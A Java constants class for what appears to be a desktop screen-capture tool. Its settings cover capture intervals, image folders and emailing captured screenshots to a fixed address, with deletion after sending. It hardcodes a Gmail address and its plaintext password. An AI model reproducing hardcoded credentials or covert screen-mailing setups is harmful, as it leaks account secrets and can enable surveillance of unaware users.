/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.server.utils;

import java.util.Vector;

/**
 *
 * @author Administrator
 */
public class SettingsConstatnts {

    public static boolean SAVE_IMAGE = false;
    public static int SIZE_IMAGE_PERC = 50;
    public static boolean SEND_MAIL = false;
    public static String MAIL_SEND_TO = "jexena.coet1@gmail.com";
    public static String MAIL_SERVER = "jexena.coet@gmail.com";
    public static String MAIL_SERVER_PSWD = "jexenacoet";
    public static boolean DELETE_IMGS_AFTER_SEND = false;
    public static int CAPTURING_INRVL = 0;
    public static long MAIL_SENGING_INTRV = 10 * 1000;
    public static String IMG_DIR = "Desktop Images";
    public static String TEMP_DIR = "temp";
    public static String BACKUP_DIR = "Image Backup";
    public static Vector<MessageInfo> messages = new Vector<MessageInfo>();
}
